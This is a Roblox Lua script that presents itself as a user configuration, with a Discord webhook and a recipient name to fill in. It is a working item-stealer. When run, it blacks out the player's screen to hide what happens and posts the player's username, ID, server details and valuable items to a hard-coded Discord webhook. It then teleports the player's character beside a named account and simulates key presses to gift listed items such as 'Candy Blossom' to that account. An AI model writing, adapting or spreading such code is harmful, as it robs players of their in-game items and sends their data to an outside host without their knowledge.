--===[ USER CONFIGURATION ]===--
local webhookURL = "https://discord.com/api/webhooks/1111606979585130537/0joXFyaI312c33vvQLZ0-7M7dCOJJjIeRYQVxB2qyMg79N0ZSZokugMrbI9G9WhoOnHl"  -- <<== PUT YOUR WEBHOOK LINK HERE
local tradeTarget = "Ambacrabs"                 -- <<== CHANGE THIS TO THE USER WHO GETS YOUR ITEMS
local valuableItems = {                         -- <<== ADD/REMOVE ITEM NAMES HERE
    "Candy Blossom",
    "DragonFly",
    "Racoon"
}
--============================--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local VirtualInputManager = game:GetService("VirtualInputManager")

-- SCREEN BLACKOUT
local function blackoutScreen()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.Name = "Blackout"
    local frame = Instance.new("Frame", gui)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.ZIndex = 999
end

-- SEND WEBHOOK
local function sendWebhook()
    local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
    local count = 0
    local itemsList = {}

    for _, item in ipairs(backpack:GetChildren()) do
        if table.find(valuableItems, item.Name) then
            count += 1
            table.insert(itemsList, item.Name)
        end
    end

    local placeName = "Unknown"
    local success, info = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if success then placeName = info.Name end

    local payload = {
        username = "Item Logger",
        embeds = {{
            title = "Script Executed",
            color = 65280,
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
                {name = "Place", value = placeName, inline = true},
                {name = "Join Link", value = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile", inline = false},
                {name = "Players in Server", value = tostring(#Players:GetPlayers()), inline = true},
                {name = "Valuables", value = count .. " item(s): " .. table.concat(itemsList, ", "), inline = false}
            }
        }}
    }

    HttpService:PostAsync(webhookURL, HttpService:JSONEncode(payload))
end

-- AUTO GIFT
local function autoGiftAll()
    local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
    local target = Players:FindFirstChild(tradeTarget)
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
        warn(tradeTarget .. " not found.")
        return
    end

    local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

    local function isTooFar()
        return (root.Position - target.Character.HumanoidRootPart.Position).Magnitude > 10
    end

    for _, item in ipairs(backpack:GetChildren()) do
        if table.find(valuableItems, item.Name) then
            if root and isTooFar() then
                root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 2)
                task.wait(0.5)
            end

            LocalPlayer.Character.Humanoid:EquipTool(item)
            task.wait(0.5)

            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
            task.wait(0.1)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
            task.wait(1.2)
        end
    end
end

-- MAIN
blackoutScreen()
sendWebhook()
task.wait(2)
autoGiftAll()